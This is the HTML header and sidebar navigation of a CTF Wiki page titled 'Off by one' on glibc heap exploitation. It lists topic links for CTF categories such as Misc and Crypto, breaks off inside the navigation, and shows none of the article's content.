



<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="CTF Wiki">
      
      
        <link rel="canonical" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one/">
      
      
        <meta name="author" content="CTF Wiki Team">
      
      
        <meta name="lang:clipboard.copy" content="复制">
      
        <meta name="lang:clipboard.copied" content="已复制">
      
        <meta name="lang:search.language" content="jp">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
      
        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
      
        <meta name="lang:search.result.other" content="# 个符合条件的结果">
      
        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
      
      <link rel="shortcut icon" href="../../../..">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.3">
    
    
      
        <title>Off by one - CTF Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/application.4031d38b.css">
      
        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
      
      
        
        
        <meta name="theme-color" content="">
      
    
    
      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
    
    
      
        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Sans:300,400,400i,700|Source+Code+Pro&display=fallback">
        <style>body,input{font-family:"Noto Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../../../_static/css/extra.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#off-by-one-in-the-heap" tabindex="1" class="md-skip">
        跳转至
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-header-nav__button md-logo">
          
            <i class="md-icon">school</i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              CTF Wiki
            </span>
            <span class="md-header-nav__topic">
              
                Off by one
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            键入以开始搜索
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

<nav class="md-tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../.." class="md-tabs__link">
          Introduction
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../misc/introduction-zh/" class="md-tabs__link">
          Misc
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../crypto/introduction-zh/" class="md-tabs__link">
          Crypto
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../web/introduction-zh/" class="md-tabs__link">
          Web
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../assembly/x86-x64/readme-zh/" class="md-tabs__link">
          Assembly
        </a>
      
    </li>
  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../executable/elf/elf-structure-zh/" class="md-tabs__link">
          Executable
        </a>
      
    </li>
  

  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../reverse/introduction-zh/" class="md-tabs__link">
          Reverse Engineering
        </a>
      
    </li>
  

  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../../readme-zh/" class="md-tabs__link">
          Pwn
        </a>
      
    </li>
  

  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../android/basic_develop/basic_develop-zh/" class="md-tabs__link">
          Android
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../ics/ctfs-zh/" class="md-tabs__link">
          ICS
        </a>
      
    </li>
  

      
    </ul>
  </div>
</nav>
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-nav__button md-logo">
      
        <i class="md-icon">school</i>
      
    </a>
    CTF Wiki
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      Introduction
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../.." title="Getting Started" class="md-nav__link">
      Getting Started
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/history-zh/" title="CTF History" class="md-nav__link">
      CTF History
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/mode-zh/" title="Introduction to CTF Competition Form" class="md-nav__link">
      Introduction to CTF Competition Form
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/content-zh/" title="CTF Contest Content" class="md-nav__link">
      CTF Contest Content
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/experience-zh/" title="Offline Attack and Defense Experience Summary" class="md-nav__link">
      Offline Attack and Defense Experience Summary
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/cgc-zh/" title="CGC Super Challenge" class="md-nav__link">
      CGC Super Challenge
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/resources-zh/" title="Learning Resources" class="md-nav__link">
      Learning Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      Misc
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        Misc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/introduction-zh/" title="Miscellaneous Introduction" class="md-nav__link">
      Miscellaneous Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/recon-zh/" title="Information Gathering Technology" class="md-nav__link">
      Information Gathering Technology
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      Code Analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        Code Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/communication-zh/" title="Commonly Used Coding in the Communication Field" class="md-nav__link">
      Commonly Used Coding in the Communication Field
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/computer-zh/" title="Computer Related Coding" class="md-nav__link">
      Computer Related Coding
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/modern-zh/" title="Commonly Used Encodings in the Real World" class="md-nav__link">
      Commonly Used Encodings in the Real World
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/prefix-zh/" title="Forensic Steganography" class="md-nav__link">
      Forensic Steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
    
    <label class="md-nav__link" for="nav-2-5">
      Image Analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-5">
        Image Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/introduction-zh/" title="Introduction to Image Analysis" class="md-nav__link">
      Introduction to Image Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/png-zh/" title="PNG" class="md-nav__link">
      PNG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/jpg-zh/" title="JPG" class="md-nav__link">
      JPG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/gif-zh/" title="GIF" class="md-nav__link">
      GIF
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
    
    <label class="md-nav__link" for="nav-2-6">
      Traffic Packet Analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-6">
        Traffic Packet Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/introduction-zh/" title="Introduction to Traffic Packet Analysis" class="md-nav__link">
      Introduction to Traffic Packet Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/fix-zh/" title="PCAP File Repairing" class="md-nav__link">
      PCAP File Repairing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6-3" type="checkbox" id="nav-2-6-3">
    
    <label class="md-nav__link" for="nav-2-6-3">
      Protocol Analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-6-3">
        Protocol Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/README-zh/" title="Overview of Protocol Analysis" class="md-nav__link">
      Overview of Protocol Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/Wireshark-zh/" title="Wireshark" class="md-nav__link">
      Wireshark
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTP-zh/" title="HTTP" class="md-nav__link">
      HTTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTPS-zh/" title="HTTPS" class="md-nav__link">
      HTTPS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/FTP-zh/" title="FTP" class="md-nav__link">
      FTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/DNS-zh/" title="DNS" class="md-nav__link">
      DNS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/WIFI-zh/" title="WIFI" class="md-nav__link">
      WIFI
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/USB-zh/" title="USB" class="md-nav__link">
      USB
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/data-zh/" title="Data Extraction" class="md-nav__link">
      Data Extraction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
    
    <label class="md-nav__link" for="nav-2-7">
      Compressed Package Analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-7">
        Compressed Package Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/zip-zh/" title="ZIP Format" class="md-nav__link">
      ZIP Format
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/rar-zh/" title="RAR Format" class="md-nav__link">
      RAR Format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/audio/introduction-zh/" title="Audio Steganography" class="md-nav__link">
      Audio Steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-9" type="checkbox" id="nav-2-9">
    
    <label class="md-nav__link" for="nav-2-9">
      Disk Memory Analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-9">
        Disk Memory Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/introduction-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/problem-zh/" title="Title" class="md-nav__link">
      Title
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-10" type="checkbox" id="nav-2-10">
    
    <label class="md-nav__link" for="nav-2-10">
      Other
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-10">
        Other
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/other/pyc-zh/" title="pyc File" class="md-nav__link">
      pyc File
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Crypto
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        Crypto
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/introduction-zh/" title="Introduction to Cryptography" class="md-nav__link">
      Introduction to Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
    
    <label class="md-nav__link" for="nav-3-2">
      Basic Mathematics
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-2">
        Basic Mathematics
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/basic/introduction-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
    
    <label class="md-nav__link" for="nav-3-3">
      Classical Cryptography
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-3">
        Classical Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/introduction-zh/" title="Introduction to Classical Cryptography" class="md-nav__link">
      Introduction to Classical Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/monoalphabetic-zh/" title="Single table Substitution Cipher" class="md-nav__link">
      Single table Substitution Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/polyalphabetic-zh/" title="Multi-table Substitution Cipher" class="md-nav__link">
      Multi-table Substitution Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/others-zh/" title="Other Types of Cipher" class="md-nav__link">
      Other Types of Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/summary-zh/" title="Summary" class="md-nav__link">
      Summary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      Stream Cipher
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-4">
        Stream Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/intro-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-2" type="checkbox" id="nav-3-4-2">
    
    <label class="md-nav__link" for="nav-3-4-2">
      Pseudo Random Number Generator
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-2">
        Pseudo Random Number Generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/intro-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/csprng-zh/" title="Cryptographic Security Pseudo-random Number Generator" class="md-nav__link">
      Cryptographic Security Pseudo-random Number Generator
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/problem-zh/" title="Challenge Examples" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-3" type="checkbox" id="nav-3-4-3">
    
    <label class="md-nav__link" for="nav-3-4-3">
      Linear Congruence Generator
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-3">
        Linear Congruence Generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/intro-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/challenge-zh/" title="Example" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-4" type="checkbox" id="nav-3-4-4">
    
    <label class="md-nav__link" for="nav-3-4-4">
      Feedback Shift Register
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-4">
        Feedback Shift Register
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/intro-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/lfsr-zh/" title="Linear Feedback Shift Register" class="md-nav__link">
      Linear Feedback Shift Register
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/nfsr-zh/" title="Nonlinear Feedback Shift Register" class="md-nav__link">
      Nonlinear Feedback Shift Register
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-5" type="checkbox" id="nav-3-4-5">
    
    <label class="md-nav__link" for="nav-3-4-5">
      Special Stream Cipher
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-5">
        Special Stream Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/special/rc4-zh/" title="RC4" class="md-nav__link">
      RC4
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      Block Cipher
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        Block Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/introduction-zh/" title="Introduction to Block Cipher" class="md-nav__link">
      Introduction to Block Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/arx-operations-zh/" title="ARX" class="md-nav__link">
      ARX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/des-zh/" title="DES" class="md-nav__link">
      DES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/idea-zh/" title="IDEA" class="md-nav__link">
      IDEA
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/aes-zh/" title="AES" class="md-nav__link">
      AES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/simon-speck-zh/" title="Simon and Speck" class="md-nav__link">
      Simon and Speck
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-7" type="checkbox" id="nav-3-5-7">
    
    <label class="md-nav__link" for="nav-3-5-7">
      Group Mode
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-5-7">
        Group Mode
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/introduction-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding-zh/" title="Padding Methods" class="md-nav__link">
      Padding Methods
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ecb-zh/" title="ECB" class="md-nav__link">
      ECB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cbc-zh/" title="CBC" class="md-nav__link">
      CBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/pcbc-zh/" title="PCBC" class="md-nav__link">
      PCBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cfb-zh/" title="CFB" class="md-nav__link">
      CFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ofb-zh/" title="OFB" class="md-nav__link">
      OFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ctr-zh/" title="CTR" class="md-nav__link">
      CTR
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding-oracle-attack-zh/" title="Padding Oracle Attack" class="md-nav__link">
      Padding Oracle Attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">
    
    <label class="md-nav__link" for="nav-3-6">
      Asymmetric Cryptography
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-6">
        Asymmetric Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/introduction-zh/" title="Introduction to Asymmetric Cryptography" class="md-nav__link">
      Introduction to Asymmetric Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-2" type="checkbox" id="nav-3-6-2">
    
    <label class="md-nav__link" for="nav-3-6-2">
      RSA
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-2">
        RSA
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_theory-zh/" title="RSA Introduction" class="md-nav__link">
      RSA Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
